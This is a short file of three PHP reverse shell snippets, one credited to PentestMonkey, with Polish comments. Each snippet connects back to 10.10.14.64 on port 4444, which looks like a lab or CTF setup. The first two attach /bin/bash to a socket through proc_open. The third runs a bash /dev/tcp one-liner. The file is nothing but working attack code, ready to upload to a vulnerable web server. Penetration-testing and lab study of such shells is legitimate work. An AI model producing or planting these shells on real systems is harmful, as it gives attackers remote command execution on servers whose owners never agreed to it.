<?php
// PHP Reverse Shell Code (Example from PentestMonkey)
$ip = '10.10.14.64';  // Twój adres IP
$port = 4444;         // Twój port nasłuchu
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    die("socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n");
}
if (socket_connect($sock, $ip, $port) === false) {
    die("socket_connect() failed: reason: " . socket_strerror(socket_last_error()) . "\n");
}
$pipe = proc_open('/bin/bash', [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
?>


<?php
// Simple one-liner PHP Reverse Shell
$ip = '10.10.14.64';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash', [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
?>

<?php system('bash -i >& /dev/tcp/10.10.14.64/4444 0>&1'); ?>